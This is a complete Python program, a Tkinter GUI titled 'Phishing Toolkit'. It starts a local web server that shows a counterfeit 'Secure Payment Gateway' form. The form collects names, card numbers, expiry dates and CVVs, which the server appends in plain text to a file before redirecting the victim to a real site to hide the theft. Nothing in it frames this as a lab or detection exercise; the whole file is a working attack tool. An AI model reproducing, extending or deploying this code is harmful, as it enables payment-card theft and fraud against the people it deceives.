import http.server
import socketserver
import threading
import urllib.parse
import tkinter as tk
import webbrowser
import socket

# Define a more realistic fake payment page
fake_pages = {
    'payment': '''
    <html>
    <head>
        <title>Secure Payment</title>
        <style>
            body { font-family: Arial, sans-serif; background-color: #e9ecef; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .payment-container { width: 500px; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.2); text-align: center; }
            .payment-container h2 { color: #007bff; margin-bottom: 20px; font-size: 28px; }
            .payment-container input { width: calc(100% - 24px); padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
            .payment-container input[type="text"] { font-size: 16px; }
            .payment-container input[type="submit"] { background-color: #007bff; color: white; border: none; cursor: pointer; font-size: 16px; padding: 15px; }
            .payment-container input[type="submit"]:hover { background-color: #0056b3; }
            .payment-container .info { font-size: 14px; color: #666; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="payment-container">
            <h2>Secure Payment Gateway</h2>
            <form action="/submit" method="post">
                <input type="hidden" name="page" value="payment">
                <input type="text" id="name" name="name" placeholder="Full Name" autocomplete="name" required>
                <input type="text" id="card_number" name="card_number" placeholder="Card Number" autocomplete="cc-number" required>
                <input type="text" id="expiry_date" name="expiry_date" placeholder="Expiry Date (MM/YY)" autocomplete="cc-exp" required>
                <input type="text" id="cvv" name="cvv" placeholder="CVV" autocomplete="cc-csc" required>
                <input type="submit" value="Submit Payment">
            </form>
            <p class="info">Your payment is securely processed.</p>
        </div>
    </body>
    </html>
    '''
}

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(fake_pages['payment'].encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        name = parsed_data.get('name', [''])[0]
        card_number = parsed_data.get('card_number', [''])[0]
        expiry_date = parsed_data.get('expiry_date', [''])[0]
        cvv = parsed_data.get('cvv', [''])[0]

        # Log payment information
        with open("payment_info.txt", "a") as file:
            file.write(f"Name: {name}, Card Number: {card_number}, Expiry Date: {expiry_date}, CVV: {cvv}\n")

        # Redirect to the real website
        if hasattr(self.server, 'real_site'):
            self.send_response(302)
            self.send_header('Location', self.server.real_site)
            self.end_headers()
        else:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Error: No redirect URL set")

class PhishingServer:
    def __init__(self, port, real_site):
        self.port = port
        self.real_site = real_site
        self.server = socketserver.TCPServer(("", port), MyHandler)
        self.server.real_site = real_site
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True

    def start(self):
        self.server_thread.start()

    def stop(self):
        self.server.shutdown()
        self.server.server_close()

# Global server instance
current_server = None

def start_server(real_site):
    global current_server
    if current_server:
        current_server.stop()
    
    current_server = PhishingServer(port=8000, real_site=real_site)
    current_server.start()

    # Get the local IP address
    local_ip = socket.gethostbyname(socket.gethostname())
    server_url = f'http://{local_ip}:8000/'
    print(f"Server started on {server_url} serving payment page")

    # Open the page in the default browser
    webbrowser.open(server_url)

def stop_server():
    global current_server
    if current_server:
        current_server.stop()
        current_server = None
        print("Server stopped")

def create_gui():
    def on_start():
        real_site = real_site_entry.get()
        if not real_site:
            status_label.config(text="Error: No redirect URL provided")
            return
        # Ensure the URL is a valid, complete URL
        if not real_site.startswith('http://') and not real_site.startswith('https://'):
            real_site = 'http://' + real_site
        start_server(real_site)

    root = tk.Tk()
    root.title("Phishing Toolkit")
    root.geometry("400x200")

    # Input for real website URL
    tk.Label(root, text="Redirect URL:", font=("Helvetica", 12)).pack(pady=10)
    real_site_entry = tk.Entry(root, width=50)
    real_site_entry.pack(pady=10)

    start_button = tk.Button(root, text="Start Server", command=on_start, bg="green", fg="white", font=("Helvetica", 12, "bold"))
    start_button.pack(pady=10)

    stop_button = tk.Button(root, text="Stop Server", command=stop_server, bg="red", fg="white", font=("Helvetica", 12, "bold"))
    stop_button.pack(pady=10)

    status_label = tk.Label(root, text="Status: Idle", font=("Helvetica", 12))
    status_label.pack(pady=20)

    root.mainloop()

if __name__ == "__main__":
    create_gui()
